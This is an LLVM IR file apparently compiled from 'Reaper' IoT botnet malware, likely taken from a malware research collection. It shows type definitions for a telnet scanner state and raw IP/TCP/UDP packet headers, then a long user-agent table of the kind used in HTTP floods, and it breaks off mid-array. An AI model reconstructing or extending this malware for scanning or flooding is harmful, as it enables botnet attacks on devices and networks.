; ModuleID = 'host/ir_sub/Reaper.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@UserAgents = global [789 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([160 x i8], [160 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.194, i32 0, i32 